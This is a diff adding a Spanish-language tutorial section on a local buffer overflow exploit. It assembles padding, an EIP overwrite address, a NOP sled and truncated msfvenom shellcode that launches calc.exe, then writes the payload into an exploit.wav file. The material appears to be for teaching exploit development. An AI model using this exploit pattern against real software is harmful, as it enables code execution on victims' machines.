@@ -424,6 +424,48 @@ Ahora que tenemos `buffer`y `eip`, podemos agregar nuestro shellcode `buf`des
     nop = b"\x90"*32
 ```
 
+### Escritura de la carga útil en un archivo
+
+Con esto nuestra carga útil final debería verse así:
+
+```python
+    offset = 4112
+    buffer = b"A"*offset
+    eip = pack('<L', 0x00419D0B)
+    nop = b"\x90"*32
+    payload = buffer + eip + nop + buf
+```
+
+Luego podemos escribir `payload` en un `exploit.wav` archivo, como lo hicimos en funciones anteriores:
+
+```python
+    with open('exploit.wav', 'wb') as f:
+        f.write(payload)
+```
+
+Una vez que ensamblamos todas estas partes, nuestra `exploit()` función final debería verse así:
+
+```python
+def exploit():
+    # msfvenom -p 'windows/exec' CMD='calc.exe' -f 'python' -b '\x00'
+    buf = b""
+    ...SNIP...
+    buf += b"\xfd\x2c\x39\x51\x60\xbf\xa1\xb8\x07\x47\x43\xc5"
+
+    offset = 4112
+    buffer = b"A"*offset
+    eip = pack('<L', 0x00419D0B)
+    nop = b"\x90"*32
+    payload = buffer + eip + nop + buf
+
+    with open('exploit.wav', 'wb') as f:
+        f.write(payload)
+
+exploit()
+```
+
+### Obtener ejecución de código
+
 
 # Remote Buffer Overflow
 
